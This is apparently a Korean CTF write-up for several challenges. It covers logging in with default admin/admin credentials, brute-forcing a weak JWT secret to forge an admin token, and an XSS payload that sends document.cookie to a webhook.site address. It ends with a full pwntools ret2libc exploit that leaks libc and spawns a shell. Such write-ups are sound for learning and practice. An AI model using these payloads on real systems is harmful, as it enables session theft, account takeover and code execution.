Watermelon (unintended)

이 문제는 언인텐으로 풀 수 있었던 문제인데, 관리자 계정이 admin/admin 으로 설정되어있다는 점을

활용해서 그냥 로그인하고 공짜로 플래그를 얻었다.

JWT

PHP JWT TOKEN 사용하는 문제이다. 문제에서 제공되는 config.js 파일에서 소스코드를 볼 수 있는데

다음과 같이 구성되어 있다.

jwt: {
    bruth: {
      key: '********', // 0~9, 8 length
      options: {
        issuer: 'c2w2m2',
        expiresIn: '1d',
        algorithm: 'HS256',
      }
 };

JWT 토큰 생성 시 사용되는 secret key 를 찾아서 무차별 대입 공격해서 찾아내야 할 것 같다.

왜냐면, key 정의한 곳에 주석으로 숫자 0~9로 구성되어있고 8자리라고 알려주기 때문에 브포하기 최적의 조건이 주어졌다.

따라서 john the ripper 사용해서 브포를 했고 secret key 를 찾은 뒤 해당 키 값으로 is_admin 값을 TRUE 로

변경해서 새 토큰을 만들어 준 뒤, 토큰 값을 바꿔주면 문제가 해결된다.

CSRF

이 문제는 문제 이름과 같이 CSRF(Cross Site Request Forgery) 취약점이다.

문제 페이지에 들어가보면 글을 쓸 수 있는 게시판 기능이 있어서 문제에서 주어진 파일을 열어서

소스코드 분석을 했더니 다음과 같은 내용을 확인할 수 있었다.

if (board.content.match(/script|img|on/i)) return res.send({ code: 400 });

content 에는 match 함수를 사용해서 필터링을 하는 로직이 있지만 의도된 건지는 몰라도 title 에는 필터링 하는 함수가 없어서 JS 사용이 가능했다.

location.href='https://webhook.site~' + document.cookie;

Exploit

#!/usr/bin/python

from pwn import *

p = process('./solo_test')

e = ELF('./solo_test')

libc = ELF('./libc227.so')

pr = 0x0000000000400b83
ret = 0x00000000004005f1

puts_plt = e.plt['puts']
puts_got = e.got['puts']
solo = e.symbols['solo']

puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search("/bin/sh"))

p.sendlineafter('>> ','Me')
p.sendlineafter('>> ','No')
p.sendlineafter('>> ','CTF')
p.sendlineafter('>> ','Never')
p.sendlineafter('>> ','No')


payload = "A"*88
payload += p64(pr)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(solo)

p.sendlineafter('--> ',payload)

puts_addr = u64(p.recv(6).ljust(8,"\x00"))

libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

payload = "A"*88
payload += p64(pr)
payload += p64(binsh_addr)
payload += p64(ret)
payload += p64(system_addr)

p.sendlineafter('--> ', payload)

p.interactive()

p.close()
